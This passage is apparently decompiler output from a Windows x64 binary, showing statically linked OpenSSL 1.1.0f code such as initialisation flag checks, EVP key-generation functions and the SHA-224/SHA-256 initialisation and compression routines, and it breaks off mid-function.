      v26 = sub_140025C90(&dword_1401408D8, sub_14001E630);
      v27 = 0;
      if ( v26 )
        v27 = dword_1401408DC;
      if ( !v27 )
        return 0i64;
    }
    if ( (a1 & 0x200) != 0 )
    {
      v28 = sub_140025C90(&dword_1401408E0, sub_14001E690);
      v29 = 0;
      if ( v28 )
        v29 = dword_1401408E4;
      if ( !v29 )
        return 0i64;
    }
    if ( (a1 & 0x400) != 0 )
    {
      v30 = sub_140025C90(&dword_1401408E8, sub_14001E600);
      v31 = 0;
      if ( v30 )
        v31 = dword_1401408EC;
      if ( !v31 )
        return 0i64;
    }
    if ( (a1 & 0x4000) != 0 )
    {
      v32 = sub_140025C90(&dword_1401408F0, sub_14001E660);
      v33 = 0;
      if ( v32 )
        v33 = dword_1401408F4;
      if ( !v33 )
        return 0i64;
    }
    if ( (a1 & 0x2000) != 0 )
    {
      v34 = sub_140025C90(&dword_1401408F8, sub_14001E5D0);
      v35 = 0;
      if ( v34 )
        v35 = dword_1401408FC;
      if ( !v35 )
        return 0i64;
    }
    if ( (a1 & 0xFE00) != 0 )
      sub_14002F870();
    if ( (*(_QWORD *)&a1 & 0x10000i64) == 0 )
      return 1i64;
    if ( (unsigned int)sub_140025C90(&dword_140140900, sub_14001E820) )
      v6 = dword_140140908;
    return v6 != 0;
  }
}
// 14001E10B: variable 'v2' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140140878: using guessed type int dword_140140878;
// 14014087C: using guessed type _DWORD dword_14014087C;
// 140140888: using guessed type __int64 qword_140140888;
// 140140890: using guessed type int dword_140140890;
// 140140894: using guessed type int dword_140140894;
// 140140898: using guessed type _DWORD dword_140140898;
// 1401408A0: using guessed type int dword_1401408A0;
// 1401408A4: using guessed type int dword_1401408A4;
// 1401408A8: using guessed type _DWORD dword_1401408A8;
// 1401408AC: using guessed type int dword_1401408AC;
// 1401408B0: using guessed type _DWORD dword_1401408B0;
// 1401408B4: using guessed type int dword_1401408B4;
// 1401408B8: using guessed type int dword_1401408B8;
// 1401408BC: using guessed type _DWORD dword_1401408BC;
// 1401408C4: using guessed type int dword_1401408C4;
// 1401408C8: using guessed type int dword_1401408C8;
// 1401408CC: using guessed type _DWORD dword_1401408CC;
// 1401408D4: using guessed type int dword_1401408D4;
// 1401408D8: using guessed type _DWORD dword_1401408D8;
// 1401408DC: using guessed type int dword_1401408DC;
// 1401408E0: using guessed type _DWORD dword_1401408E0;
// 1401408E4: using guessed type int dword_1401408E4;
// 1401408E8: using guessed type _DWORD dword_1401408E8;
// 1401408EC: using guessed type int dword_1401408EC;
// 1401408F0: using guessed type _DWORD dword_1401408F0;
// 1401408F4: using guessed type int dword_1401408F4;
// 1401408F8: using guessed type _DWORD dword_1401408F8;
// 1401408FC: using guessed type int dword_1401408FC;
// 140140900: using guessed type _DWORD dword_140140900;
// 140140908: using guessed type int dword_140140908;
// 14014090C: using guessed type int dword_14014090C;
// 140140918: using guessed type __int64 qword_140140918;

//----- (000000014001E450) ----------------------------------------------------
_BOOL8 sub_14001E450()
{
  _BOOL8 result; // rax

  result = sub_14002DEB0();
  dword_1401408AC = 1;
  return result;
}
// 1401408AC: using guessed type int dword_1401408AC;

//----- (000000014001E480) ----------------------------------------------------
_BOOL8 sub_14001E480()
{
  _BOOL8 result; // rax

  result = sub_14002E830();
  dword_1401408B4 = 1;
  return result;
}
// 1401408B4: using guessed type int dword_1401408B4;

//----- (000000014001E4B0) ----------------------------------------------------
__int64 sub_14001E4B0()
{
  __int64 result; // rax

  result = sub_14002F820();
  if ( (_DWORD)result )
  {
    dword_1401408D0 = 1;
    dword_1401408D4 = 1;
  }
  else
  {
    dword_1401408D4 = 0;
  }
  return result;
}
// 1401408D0: using guessed type int dword_1401408D0;
// 1401408D4: using guessed type int dword_1401408D4;

//----- (000000014001E4F0) ----------------------------------------------------
__int64 sub_14001E4F0()
{
  __int64 result; // rax
  _QWORD *v1; // rax

  sub_140025BA0(dword_140140910);
  atexit(sub_14001DF90);
  result = (__int64)sub_140025C10();
  qword_140140888 = result;
  if ( result )
  {
    dword_140140890 = 1;
    sub_1400248C0();
    v1 = sub_140035230((__int64)&dword_140140890, 4);
    sub_1400352F0(v1);
    sub_1400244F0();
    return 1i64;
  }
  return result;
}
// 140003C30: using guessed type __int64 __fastcall guard_check_icall_nop();
// 140140888: using guessed type __int64 qword_140140888;
// 140140890: using guessed type int dword_140140890;
// 140140910: using guessed type _DWORD dword_140140910[2];

//----- (000000014001E570) ----------------------------------------------------
__int64 sub_14001E570()
{
  __int64 result; // rax

  result = sub_14001E4F0();
  dword_140140894 = result;
  return result;
}
// 140140894: using guessed type int dword_140140894;

//----- (000000014001E590) ----------------------------------------------------
__int64 sub_14001E590()
{
  __int64 result; // rax

  result = sub_14002E970((char *)qword_140140918);
  dword_1401408C0 = 1;
  dword_1401408C4 = 1;
  return result;
}
// 1401408C0: using guessed type int dword_1401408C0;
// 1401408C4: using guessed type int dword_1401408C4;
// 140140918: using guessed type __int64 qword_140140918;

//----- (000000014001E5D0) ----------------------------------------------------
void sub_14001E5D0()
{
  sub_140034750();
  dword_1401408FC = 1;
}
// 1401408FC: using guessed type int dword_1401408FC;

//----- (000000014001E600) ----------------------------------------------------
void sub_14001E600()
{
  sub_140030E90();
  dword_1401408EC = 1;
}
// 1401408EC: using guessed type int dword_1401408EC;

//----- (000000014001E630) ----------------------------------------------------
void sub_14001E630()
{
  sub_14002FDE0();
  dword_1401408DC = 1;
}
// 1401408DC: using guessed type int dword_1401408DC;

//----- (000000014001E660) ----------------------------------------------------
void sub_14001E660()
{
  dword_1401408F4 = 1;
}
// 140003C30: using guessed type __int64 __fastcall guard_check_icall_nop();
// 1401408F4: using guessed type int dword_1401408F4;

//----- (000000014001E690) ----------------------------------------------------
void sub_14001E690()
{
  dword_1401408E4 = 1;
}
// 140003C30: using guessed type __int64 __fastcall guard_check_icall_nop();
// 1401408E4: using guessed type int dword_1401408E4;

//----- (000000014001E6C0) ----------------------------------------------------
_BOOL8 sub_14001E6C0()
{
  _BOOL8 result; // rax

  result = sub_140034EF0();
  dword_1401408A4 = result;
  dword_14014089C = 1;
  return result;
}
// 14014089C: using guessed type int dword_14014089C;
// 1401408A4: using guessed type int dword_1401408A4;

//----- (000000014001E6F0) ----------------------------------------------------
void sub_14001E6F0()
{
  dword_1401408B8 = 1;
}
// 1401408B8: using guessed type int dword_1401408B8;

//----- (000000014001E700) ----------------------------------------------------
void sub_14001E700()
{
  sub_14002E9C0();
  dword_1401408C0 = 1;
  dword_1401408C8 = 1;
}
// 1401408C0: using guessed type int dword_1401408C0;
// 1401408C8: using guessed type int dword_1401408C8;

//----- (000000014001E730) ----------------------------------------------------
void sub_14001E730()
{
  dword_1401408A0 = 1;
}
// 1401408A0: using guessed type int dword_1401408A0;

//----- (000000014001E740) ----------------------------------------------------
__int64 __fastcall sub_14001E740(char a1)
{
  _DWORD *v2; // rbx

  v2 = (_DWORD *)sub_140025B80(dword_140140910);
  if ( !v2 )
  {
    v2 = sub_14001DC20(8ui64);
    sub_140025CC0(dword_140140910, (__int64)v2);
    if ( !v2 )
      return 0i64;
  }
  if ( (a1 & 1) != 0 )
    *v2 = 1;
  if ( (a1 & 2) != 0 )
    v2[1] = 1;
  return 1i64;
}
// 140140910: using guessed type _DWORD dword_140140910[2];

//----- (000000014001E7D0) ----------------------------------------------------
void __fastcall sub_14001E7D0(_DWORD *a1)
{
  if ( a1 )
  {
    if ( *a1 )
      sub_14002F610();
    if ( a1[1] )
      sub_140024B00();
    sub_14001D930(a1);
  }
}

//----- (000000014001E820) ----------------------------------------------------
void sub_14001E820()
{
  dword_140140904 = 1;
  dword_140140908 = 1;
}
// 140140904: using guessed type int dword_140140904;
// 140140908: using guessed type int dword_140140908;

//----- (000000014001E840) ----------------------------------------------------
_BOOL8 __fastcall sub_14001E840(unsigned int *a1)
{
  char *v3; // rax
  char *v4; // rax

  if ( !a1 )
    return 0i64;
  v3 = sub_14002C1A0(*a1);
  if ( !sub_1400358A0((__int64)v3, 2, (__int64)a1) )
    return 0i64;
  v4 = sub_14002C030(*a1);
  return sub_1400358A0((__int64)v4, 2, (__int64)a1);
}

//----- (000000014001E8A0) ----------------------------------------------------
_BOOL8 __fastcall sub_14001E8A0(unsigned int *a1)
{
  char *v2; // rdi
  _BOOL8 result; // rax
  char *v4; // rax
  unsigned int v5; // ecx
  char *v6; // rax
  char *v7; // rax

  v2 = sub_14002C1A0(*a1);
  if ( !sub_1400358A0((__int64)v2, 1, (__int64)a1) )
    return 0i64;
  v4 = sub_14002C030(*a1);
  result = sub_1400358A0((__int64)v4, 1, (__int64)a1);
  if ( !result )
    return 0i64;
  v5 = a1[1];
  if ( v5 && *a1 != v5 )
  {
    v6 = sub_14002C1A0(v5);
    if ( sub_1400358A0((__int64)v6, 32769, (__int64)v2) )
    {
      v7 = sub_14002C030(a1[1]);
      return sub_1400358A0((__int64)v7, 32769, (__int64)v2);
    }
    return 0i64;
  }
  return result;
}

//----- (000000014001E950) ----------------------------------------------------
__int64 __fastcall sub_14001E950(__int64 a1)
{
  int v1; // eax

  if ( (unsigned int)sub_14001E0C0((unsigned int)(v1 - 28), 0i64) )
    return sub_140035A70(a1, 2);
  else
    return 0i64;
}
// 14001E964: variable 'v1' is possibly undefined
// 14001E0C0: using guessed type __int64 __fastcall sub_14001E0C0(_QWORD, _QWORD);

//----- (000000014001E990) ----------------------------------------------------
__int64 __fastcall sub_14001E990(__int64 a1)
{
  int v1; // eax

  if ( (unsigned int)sub_14001E0C0((unsigned int)(v1 - 24), 0i64) )
    return sub_140035A70(a1, 1);
  else
    return 0i64;
}
// 14001E9A4: variable 'v1' is possibly undefined
// 14001E0C0: using guessed type __int64 __fastcall sub_14001E0C0(_QWORD, _QWORD);

//----- (000000014001E9D0) ----------------------------------------------------
void __fastcall sub_14001E9D0()
{
  int v0; // eax

  sub_1400359D0(v0 - 38);
  sub_1400359D0(1);
  sub_1400359D0(-1);
  sub_140036240();
  sub_140035F30();
}
// 14001E9DD: variable 'v0' is possibly undefined

//----- (000000014001EA10) ----------------------------------------------------
__int64 __fastcall sub_14001EA10(_DWORD *a1, __int64 *a2)
{
  _DWORD *v5; // rax
  int v6; // edi

  if ( a1 && *(_QWORD *)a1 && *(_QWORD *)(*(_QWORD *)a1 + 56i64) )
  {
    if ( a1[8] != 4 )
    {
      sub_140024610(6, 146, 151, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_gn.c", 95);
      return 0xFFFFFFFFi64;
    }
    if ( !a2 )
      return 0xFFFFFFFFi64;
    if ( !*a2 )
    {
      v5 = sub_14001D530();
      *a2 = (__int64)v5;
      if ( !v5 )
        return 0xFFFFFFFFi64;
    }
    v6 = (*(__int64 (__fastcall **)(_DWORD *, __int64))(*(_QWORD *)a1 + 56i64))(a1, *a2);
    if ( v6 <= 0 )
    {
      sub_14001D3C0(*a2);
      *a2 = 0i64;
    }
    return (unsigned int)v6;
  }
  else
  {
    sub_140024610(6, 146, 150, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_gn.c", 91);
    return 4294967294i64;
  }
}

//----- (000000014001EB00) ----------------------------------------------------
__int64 __fastcall sub_14001EB00(__int64 *a1)
{
  __int64 v2; // rax
  __int64 (*v3)(void); // rdx
  __int64 result; // rax

  if ( a1 && (v2 = *a1) != 0 && *(_QWORD *)(v2 + 56) )
  {
    *((_DWORD *)a1 + 8) = 4;
    v3 = *(__int64 (**)(void))(v2 + 48);
    if ( v3 )
    {
      result = v3();
      if ( (int)result <= 0 )
        *((_DWORD *)a1 + 8) = 0;
    }
    else
    {
      return 1i64;
    }
  }
  else
  {
    sub_140024610(6, 147, 150, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_gn.c", 73);
    return 4294967294i64;
  }
  return result;
}

//----- (000000014001EB80) ----------------------------------------------------
__int64 *__fastcall sub_14001EB80(unsigned int a1, __int64 a2, __int64 a3, unsigned int a4)
{
  __int64 v4; // rdi
  __int64 *result; // rax
  __int64 *v8; // rbx
  __int64 v9[3]; // [rsp+30h] [rbp-18h] BYREF

  v4 = 0i64;
  v9[0] = 0i64;
  result = sub_140020790(a1, a2);
  v8 = result;
  if ( result )
  {
    if ( (int)sub_14001EB00(result) > 0 && (int)sub_140020440(v8, -1, 4, 6u, a4, a3) > 0 )
    {
      sub_14001EA10(v8, v9);
      v4 = v9[0];
    }
    sub_140020670(v8);
    return (__int64 *)v4;
  }
  return result;
}
// 14001EB80: using guessed type __int64 var_18[3];

//----- (000000014001EC20) ----------------------------------------------------
__int64 __fastcall sub_14001EC20(_DWORD *a1, __int64 *a2)
{
  _DWORD *v5; // rax
  int v6; // edi

  if ( a1 && *(_QWORD *)a1 && *(_QWORD *)(*(_QWORD *)a1 + 40i64) )
  {
    if ( a1[8] != 2 )
    {
      sub_140024610(6, 148, 151, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_gn.c", 45);
      return 0xFFFFFFFFi64;
    }
    if ( !a2 )
      return 0xFFFFFFFFi64;
    if ( *a2 || (v5 = sub_14001D530(), (*a2 = (__int64)v5) != 0) )
    {
      v6 = (*(__int64 (__fastcall **)(_DWORD *, __int64))(*(_QWORD *)a1 + 40i64))(a1, *a2);
      if ( v6 <= 0 )
      {
        sub_14001D3C0(*a2);
        *a2 = 0i64;
      }
      return (unsigned int)v6;
    }
    else
    {
      sub_140024610(6, 148, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_gn.c", 56);
      return 0xFFFFFFFFi64;
    }
  }
  else
  {
    sub_140024610(6, 148, 150, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_gn.c", 40);
    return 4294967294i64;
  }
}

//----- (000000014001ED40) ----------------------------------------------------
__int64 __fastcall sub_14001ED40(__int64 *a1)
{
  __int64 v2; // rax
  __int64 (*v3)(void); // rdx
  __int64 result; // rax

  if ( a1 && (v2 = *a1) != 0 && *(_QWORD *)(v2 + 40) )
  {
    *((_DWORD *)a1 + 8) = 2;
    v3 = *(__int64 (**)(void))(v2 + 32);
    if ( v3 )
    {
      result = v3();
      if ( (int)result <= 0 )
        *((_DWORD *)a1 + 8) = 0;
    }
    else
    {
      return 1i64;
    }
  }
  else
  {
    sub_140024610(6, 149, 150, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\pmeth_gn.c", 23);
    return 4294967294i64;
  }
  return result;
}

//----- (000000014001EDC0) ----------------------------------------------------
void __fastcall sub_14001EDC0(__int64 a1, __int64 a2)
{
  sub_140026800(a1, (__int64)sub_14001EDE0, a2);
}

//----- (000000014001EDE0) ----------------------------------------------------
__int64 __fastcall sub_14001EDE0(DWORD a1, int a2, __FrameHandler3::TryBlockMap *a3)
{
  struct _xDISPATCHER_CONTEXT *v5; // rax

  v5 = __FrameHandler3::TryBlockMap::getpDC(a3);
  v5->HistoryTable->Count = a1;
  *(_DWORD *)&v5->HistoryTable->LocalHint = a2;
  return ((__int64 (__fastcall *)(struct _xDISPATCHER_CONTEXT *))v5->HandlerData)(v5);
}

//----- (000000014001EE20) ----------------------------------------------------
__int64 __fastcall sub_14001EE20(_DWORD *a1)
{
  int v1; // eax
  __int64 result; // rax

  memset(a1, 0, (unsigned int)(v1 + 80));
  result = 1i64;
  *a1 = -1056596264;
  a1[1] = 914150663;
  a1[2] = 812702999;
  a1[3] = -150054599;
  a1[4] = -4191439;
  a1[5] = 1750603025;
  a1[6] = 1694076839;
  a1[7] = -1090891868;
  a1[27] = 28;
  return result;
}
// 14001EE31: variable 'v1' is possibly undefined

//----- (000000014001EE90) ----------------------------------------------------
__int64 __fastcall sub_14001EE90(_BYTE *a1, __int64 a2)
{
  __int64 v2; // r15
  __int64 v3; // r14
  unsigned int v4; // esi
  unsigned __int64 v7; // r15
  unsigned int v8; // eax
  __int64 v10; // rax
  int v11; // ecx
  int v12; // ecx
  int v13; // ecx
  int v14; // ecx
  int v15; // ecx
  int v16; // ecx
  int v17; // ecx
  int v18; // ecx
  int v19; // ecx
  int v20; // ecx
  int v21; // ecx
  int v22; // ecx
  int v23; // ecx
  int v24; // ecx
  int v25; // ecx
  int v26; // edx

  v2 = *(unsigned int *)(a2 + 104);
  v3 = a2 + 40;
  v4 = 0;
  *(_BYTE *)(v2 + a2 + 40) = 0x80;
  v7 = v2 + 1;
  if ( v7 > 0x38 )
  {
    memset((void *)(v7 + v3), 0, 64 - v7);
    v7 = 0i64;
    sub_14001F350((int *)a2, (unsigned int *)v3, 1i64);
  }
  memset((void *)(v7 + v3), 0, 56 - v7);
  *(_BYTE *)(v3 + 56) = *(_BYTE *)(a2 + 39);
  *(_BYTE *)(v3 + 57) = *(_BYTE *)(a2 + 38);
  *(_BYTE *)(v3 + 58) = *(_BYTE *)(a2 + 37);
  *(_BYTE *)(v3 + 59) = *(_BYTE *)(a2 + 36);
  *(_BYTE *)(v3 + 60) = *(_BYTE *)(a2 + 35);
  *(_BYTE *)(v3 + 61) = *(_BYTE *)(a2 + 34);
  *(_BYTE *)(v3 + 62) = *(_BYTE *)(a2 + 33);
  *(_BYTE *)(v3 + 63) = *(_BYTE *)(a2 + 32);
  sub_14001F350((int *)a2, (unsigned int *)v3, 1i64);
  *(_DWORD *)(a2 + 104) = 0;
  sub_140023440(v3, 64i64);
  v8 = *(_DWORD *)(a2 + 108);
  if ( v8 == 28 )
  {
    v20 = *(_DWORD *)a2;
    *a1 = HIBYTE(*(_DWORD *)a2);
    a1[1] = BYTE2(v20);
    a1[2] = BYTE1(v20);
    a1[3] = v20;
    v21 = *(_DWORD *)(a2 + 4);
    a1[4] = HIBYTE(v21);
    a1[5] = BYTE2(v21);
    a1[6] = BYTE1(v21);
    a1[7] = v21;
    v22 = *(_DWORD *)(a2 + 8);
    a1[8] = HIBYTE(v22);
    a1[9] = BYTE2(v22);
    a1[10] = BYTE1(v22);
    a1[11] = v22;
    v23 = *(_DWORD *)(a2 + 12);
    a1[12] = HIBYTE(v23);
    a1[13] = BYTE2(v23);
    a1[14] = BYTE1(v23);
    a1[15] = v23;
    v24 = *(_DWORD *)(a2 + 16);
    a1[16] = HIBYTE(v24);
    a1[17] = BYTE2(v24);
    a1[18] = BYTE1(v24);
    a1[19] = v24;
    v25 = *(_DWORD *)(a2 + 20);
    a1[20] = HIBYTE(v25);
    a1[21] = BYTE2(v25);
    a1[22] = BYTE1(v25);
    a1[23] = v25;
    v26 = *(_DWORD *)(a2 + 24);
    a1[24] = HIBYTE(v26);
    a1[25] = BYTE2(v26);
    a1[26] = BYTE1(v26);
    a1[27] = v26;
  }
  else if ( v8 == 32 )
  {
    v12 = *(_DWORD *)a2;
    *a1 = HIBYTE(*(_DWORD *)a2);
    a1[1] = BYTE2(v12);
    a1[2] = BYTE1(v12);
    a1[3] = v12;
    v13 = *(_DWORD *)(a2 + 4);
    a1[4] = HIBYTE(v13);
    a1[5] = BYTE2(v13);
    a1[6] = BYTE1(v13);
    a1[7] = v13;
    v14 = *(_DWORD *)(a2 + 8);
    a1[8] = HIBYTE(v14);
    a1[9] = BYTE2(v14);
    a1[10] = BYTE1(v14);
    a1[11] = v14;
    v15 = *(_DWORD *)(a2 + 12);
    a1[12] = HIBYTE(v15);
    a1[13] = BYTE2(v15);
    a1[14] = BYTE1(v15);
    a1[15] = v15;
    v16 = *(_DWORD *)(a2 + 16);
    a1[16] = HIBYTE(v16);
    a1[17] = BYTE2(v16);
    a1[18] = BYTE1(v16);
    a1[19] = v16;
    v17 = *(_DWORD *)(a2 + 20);
    a1[20] = HIBYTE(v17);
    a1[21] = BYTE2(v17);
    a1[22] = BYTE1(v17);
    a1[23] = v17;
    v18 = *(_DWORD *)(a2 + 24);
    a1[24] = HIBYTE(v18);
    a1[25] = BYTE2(v18);
    a1[26] = BYTE1(v18);
    a1[27] = v18;
    v19 = *(_DWORD *)(a2 + 28);
    a1[28] = HIBYTE(v19);
    a1[29] = BYTE2(v19);
    a1[30] = BYTE1(v19);
    a1[31] = v19;
  }
  else
  {
    if ( v8 > 0x20 )
      return 0i64;
    if ( (v8 & 0xFFFFFFFC) != 0 )
    {
      do
      {
        v10 = v4;
        a1 += 4;
        ++v4;
        v11 = *(_DWORD *)(a2 + 4 * v10);
        *(a1 - 4) = HIBYTE(v11);
        *(a1 - 3) = BYTE2(v11);
        *(a1 - 2) = BYTE1(v11);
        *(a1 - 1) = v11;
      }
      while ( v4 < *(_DWORD *)(a2 + 108) >> 2 );
    }
  }
  return 1i64;
}

//----- (000000014001F1B0) ----------------------------------------------------
__int64 __fastcall sub_14001F1B0(_DWORD *a1)
{
  int v1; // eax
  __int64 result; // rax

  memset(a1, 0, (unsigned int)(v1 + 80));
  result = 1i64;
  *a1 = 1779033703;
  a1[1] = -1150833019;
  a1[2] = 1013904242;
  a1[3] = -1521486534;
  a1[4] = 1359893119;
  a1[5] = -1694144372;
  a1[6] = 528734635;
  a1[7] = 1541459225;
  a1[27] = 32;
  return result;
}
// 14001F1C1: variable 'v1' is possibly undefined

//----- (000000014001F220) ----------------------------------------------------
__int64 __fastcall sub_14001F220(__int64 a1, unsigned int *a2, size_t a3)
{
  size_t v3; // rdi
  unsigned int *v4; // rbp
  unsigned int v6; // eax
  unsigned int v7; // ecx
  __int64 v8; // rcx
  _QWORD *v9; // r14
  __int64 v10; // rbx
  size_t v11; // rbx

  v3 = a3;
  v4 = a2;
  if ( a3 )
  {
    v6 = *(_DWORD *)(a1 + 32);
    v7 = v6 + 8 * a3;
    if ( v7 < v6 )
      ++*(_DWORD *)(a1 + 36);
    *(_DWORD *)(a1 + 32) = v7;
    v8 = *(unsigned int *)(a1 + 104);
    *(_DWORD *)(a1 + 36) += a3 >> 29;
    if ( v8 )
    {
      v9 = (_QWORD *)(a1 + 40);
      if ( a3 < 0x40 && v8 + a3 < 0x40 )
      {
        memmove((char *)v9 + v8, a2, a3);
        *(_DWORD *)(a1 + 104) += v3;
        return 1i64;
      }
      v10 = 64 - v8;
      memmove((char *)v9 + v8, a2, 64 - v8);
      sub_14001F350((int *)a1, (unsigned int *)(a1 + 40), 1i64);
      *(_DWORD *)(a1 + 104) = 0;
      v4 = (unsigned int *)((char *)v4 + v10);
      v3 -= v10;
      *v9 = 0i64;
      *(_QWORD *)(a1 + 48) = 0i64;
      *(_QWORD *)(a1 + 56) = 0i64;
      *(_QWORD *)(a1 + 64) = 0i64;
      *(_QWORD *)(a1 + 72) = 0i64;
      *(_QWORD *)(a1 + 80) = 0i64;
      *(_QWORD *)(a1 + 88) = 0i64;
      *(_QWORD *)(a1 + 96) = 0i64;
    }
    if ( v3 >> 6 )
    {
      sub_14001F350((int *)a1, v4, v3 >> 6);
      v11 = v3 >> 6 << 6;
      v4 = (unsigned int *)((char *)v4 + v11);
      v3 -= v11;
    }
    if ( v3 )
    {
      *(_DWORD *)(a1 + 104) = v3;
      memmove((void *)(a1 + 40), v4, v3);
    }
  }
  return 1i64;
}

//----- (000000014001F350) ----------------------------------------------------
void __fastcall sub_14001F350(int *a1, unsigned int *a2, __int64 a3)
{
  int v3; // r9d
  __int64 v4; // rax
  int v5; // r10d
  int v7; // r11d
  int v8; // ebx
  int v9; // esi
  int v10; // edi
  int v11; // r14d
  int v12; // r15d
  int v13; // r12d
  int v14; // r9d
  int v15; // edx
  int v16; // r11d
  int v17; // edi
  int v18; // edx
  int v19; // r10d
  int v20; // r12d
  int v21; // edx
  int v22; // r9d
  int v23; // esi
  int v24; // edx
  int v25; // ebx
  int v26; // r14d
  int v27; // edx
  int v28; // edi
  int v29; // r11d
  int v30; // edx
  int v31; // r12d
  int v32; // r10d
  int v33; // edx
  int v34; // esi
  int v35; // r15d
  int v36; // edx
  int v37; // r14d
  int v38; // ebx
  unsigned int v39; // edx
  unsigned int v40; // r11d
  int v41; // edx
  int v42; // r10d
  int v43; // edi
  int v44; // r8d
  int v45; // r15d
  int v46; // eax
  int v47; // r8d
  int v48; // ebx
  int v49; // r13d
  unsigned int v50; // r8d
  int v51; // esi
  unsigned int v52; // r9d
  int v53; // r8d
  int v54; // r14d
  int v55; // r8d
  int v56; // eax
  int v57; // r11d
  unsigned int v58; // r9d
  int v59; // r8d
  int v60; // r13d
  char v61; // r10
  int v62; // ebx
  int *v63; // rdi
  int *v64; // r15
  int *v65; // r12
  __int64 v66; // rcx
  int v67; // r10d
  int v68; // r11d
  unsigned int v69; // r8d
  int *v70; // rbx
  unsigned int v71; // r9d
  int v72; // r8d
  int *v73; // r10
  int v74; // r8d
  int v75; // eax
  int *v76; // rsi
  int v77; // r8d
  int v78; // r13d
  int *v79; // rdi
  unsigned int v80; // r8d
  int *v81; // r11
  unsigned int v82; // r8d
  unsigned int v83; // edx
  int v84; // r15d
  int v85; // r9d
  int *v86; // r10
  int v87; // r8d
  unsigned int v88; // r8d
  _DWORD *v89; // rcx
  int v90; // r8d
  int v91; // r8d
  int v92; // r9d
  int v93; // [rsp+0h] [rbp-89h]
  unsigned int v94; // [rsp+0h] [rbp-89h]
  int v95; // [rsp+0h] [rbp-89h]
  int v96; // [rsp+4h] [rbp-85h]
  int v97; // [rsp+4h] [rbp-85h]
  int v98; // [rsp+8h] [rbp-81h]
  int v99; // [rsp+8h] [rbp-81h]
  int v100; // [rsp+Ch] [rbp-7Dh]
  int v101; // [rsp+Ch] [rbp-7Dh]
  int v102; // [rsp+10h] [rbp-79h]
  int v103; // [rsp+10h] [rbp-79h]
  int v104; // [rsp+18h] [rbp-71h]
  _DWORD *v105; // [rsp+20h] [rbp-69h]
  unsigned int v106; // [rsp+28h] [rbp-61h]
  int v107; // [rsp+28h] [rbp-61h]
  int v108; // [rsp+2Ch] [rbp-5Dh]
  int v109; // [rsp+30h] [rbp-59h]
  int v110; // [rsp+34h] [rbp-55h]
  int v111; // [rsp+38h] [rbp-51h]
  int v112; // [rsp+3Ch] [rbp-4Dh]
  int v113; // [rsp+40h] [rbp-49h]
  int v114; // [rsp+44h] [rbp-45h]
  int v115; // [rsp+48h] [rbp-41h]
  unsigned int *v116; // [rsp+50h] [rbp-39h]
  unsigned int *v117; // [rsp+50h] [rbp-39h]
  __int64 v119; // [rsp+60h] [rbp-29h]
  unsigned int v120; // [rsp+70h] [rbp-19h] BYREF
  unsigned int v121; // [rsp+74h] [rbp-15h]
  unsigned int v122; // [rsp+78h] [rbp-11h]
  unsigned int v123; // [rsp+7Ch] [rbp-Dh]
  unsigned int v124; // [rsp+80h] [rbp-9h]
  unsigned int v125; // [rsp+84h] [rbp-5h]
  unsigned int v126; // [rsp+88h] [rbp-1h]
  unsigned int v127; // [rsp+8Ch] [rbp+3h]
  unsigned int v128; // [rsp+90h] [rbp+7h]
  unsigned int v129; // [rsp+94h] [rbp+Bh]
  unsigned int v130; // [rsp+98h] [rbp+Fh]
  unsigned int v131; // [rsp+9Ch] [rbp+13h]
  unsigned int v132; // [rsp+A0h] [rbp+17h]
  unsigned int v133; // [rsp+A4h] [rbp+1Bh]
  unsigned int v134; // [rsp+A8h] [rbp+1Fh]
  unsigned int v135; // [rsp+ACh] [rbp+23h]

  if ( a3 )
  {
    v3 = a1[1];
    v4 = a3;
    v5 = a1[2];
    v7 = a1[3];
    v8 = *a1;
    v9 = a1[5];
    v10 = a1[7];
    v11 = a1[4];
    v12 = a1[6];
    v114 = v12;
    v109 = *a1;
    v108 = v3;
    v110 = v5;
    v111 = v7;
    v112 = v11;
    v113 = v9;
    v115 = v10;
    do
    {
      v119 = v4 - 1;
      v13 = v8 ^ v3;
      v14 = v8 & v3;
      v120 = _byteswap_ulong(*a2);
      v15 = v10
          + (__ROL4__(v11, 7) ^ __ROL4__(v11, 21) ^ __ROL4__(v11, 26))
          + (v9 & v11 ^ v12 & ~v11)
          + v120
          + 1116352408;
      v16 = v15 + v7;
      v17 = v15 + (__ROL4__(v8, 19) ^ __ROL4__(v8, 30) ^ __ROL4__(v8, 10)) + (v14 ^ v5 & v13);
      v121 = _byteswap_ulong(a2[1]);
      v18 = v12
          + (__ROL4__(v16, 7) ^ __ROL4__(v16, 21) ^ __ROL4__(v16, 26))
          + (v16 & v11 ^ v9 & ~v16)
          + v121
          + 1899447441;
      v19 = v18 + v5;
      v20 = v18 + (__ROL4__(v17, 19) ^ __ROL4__(v17, 30) ^ __ROL4__(v17, 10)) + (v14 ^ v17 & v13);
      v122 = _byteswap_ulong(a2[2]);
      v21 = v9
          + (__ROL4__(v19, 7) ^ __ROL4__(v19, 21) ^ __ROL4__(v19, 26))
          + (v19 & v16 ^ v11 & ~v19)
          + v122
          - 1245643825;
      v22 = v21 + v108;
      v23 = v21 + (__ROL4__(v20, 10) ^ __ROL4__(v20, 19) ^ __ROL4__(v20, 30)) + (v20 & v8 ^ v17 & (v20 ^ v8));
      v123 = _byteswap_ulong(a2[3]);
      v24 = v123
          - 373957723
          + (v22 & v19 ^ v16 & ~v22)
          + v11
          + (__ROL4__(v22, 7) ^ __ROL4__(v21 + v108, 21) ^ __ROL4__(v21 + v108, 26));
      v25 = v24 + v8;
      v26 = v24 + (__ROL4__(v23, 10) ^ __ROL4__(v23, 19) ^ __ROL4__(v23, 30)) + (v23 & v20 ^ v17 & (v23 ^ v20));
      v124 = _byteswap_ulong(a2[4]);
      v27 = v124
          + (__ROL4__(v25, 7) ^ __ROL4__(v25, 21) ^ __ROL4__(v25, 26))
          + (v25 & v22 ^ v19 & ~v25)
          + v16
          + 961987163;
      v28 = v27 + v17;
      v29 = v27 + (__ROL4__(v26, 10) ^ __ROL4__(v26, 19) ^ __ROL4__(v26, 30)) + (v26 & v23 ^ v20 & (v26 ^ v23));
      v125 = _byteswap_ulong(a2[5]);
      v30 = v19
